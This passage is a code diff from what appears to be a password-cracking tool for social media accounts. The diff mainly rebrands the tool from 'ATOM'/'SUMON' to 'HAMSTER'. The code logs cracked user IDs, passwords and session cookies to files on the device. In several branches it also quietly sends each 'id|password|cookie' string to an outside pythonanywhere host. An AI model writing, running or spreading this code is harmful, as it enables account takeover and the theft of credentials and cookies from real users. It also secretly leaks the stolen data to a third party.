+                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1616,26 +1618,26 @@ def d(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1654,7 +1656,7 @@ def cracker(uid, pwx, tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(SUMON) ({loop}) (OK-{len(oks)})\r"),
+    sys.stdout.write(f"\r {green}(HAMSTER) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         first6digit = uid[0:6]
@@ -1907,21 +1909,21 @@ def cracker(uid, pwx, tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                         print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         oks.append(cid)
                         break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
